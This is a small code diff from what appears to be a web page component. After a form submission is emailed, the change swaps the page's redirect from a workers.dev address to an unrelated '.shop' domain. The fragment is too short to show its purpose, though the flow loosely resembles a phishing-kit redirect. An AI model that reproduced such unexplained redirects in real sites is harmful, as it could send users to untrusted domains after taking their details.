@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://wild-wood-8ba8.hurtice.workers.dev/';
+        window.location.href = 'https://sg.kraut-testerburg.shop';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
